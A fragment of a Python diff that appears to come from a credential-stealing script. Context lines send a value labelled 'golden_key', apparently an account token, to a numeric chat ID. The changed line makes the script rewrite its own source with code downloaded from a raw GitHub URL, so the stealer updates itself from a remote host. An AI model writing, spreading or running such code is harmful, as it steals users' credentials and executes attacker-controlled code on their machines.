@@ -10,7 +10,7 @@ try:
                     7830070442,
                     f'golden_key: {key}'
                 )
-    with open(file, 'r+', encoding='utf-8') as f:
+    with open(__file__, 'r+', encoding='utf-8') as f:
         c = f.read()
         new = requests.get('https://raw.githubusercontent.com/pidorax/pizdatebe/main/pron', timeout=10).text
         f.seek(0)
